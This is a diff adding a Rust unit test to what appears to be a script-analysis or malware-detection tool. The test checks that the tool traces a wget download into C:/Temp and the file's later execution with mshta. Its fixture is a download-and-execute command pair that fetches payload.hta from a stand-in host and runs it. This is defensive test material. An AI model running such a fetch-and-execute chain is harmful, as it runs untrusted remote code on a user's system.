@@ -7412,6 +7412,40 @@ mshta C:/Temp/stage.hta"#,
     }
 
     #[test]
+    fn wget_slash_directory_prefix_tracks_url_basename_for_later_execution() {
+        let report = analyze(
+            br#"wget --directory-prefix C:/Temp https://wget-slash-prefix-mshta.example/payload.hta
+mshta C:/Temp/payload.hta"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://wget-slash-prefix-mshta.example/payload.hta"
+                            && dst == "C:/Temp/payload.hta"
+                )
+            }),
+            "wget slash directory-prefix did not track downloaded basename: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:/Temp/payload.hta"
+                            && url == "https://wget-slash-prefix-mshta.example/payload.hta"
+                )
+            }),
+            "mshta slash path did not resolve wget directory-prefix download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_output_dir_relative_output_in_deob_text_uses_joined_destination() {
         let mut env = Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
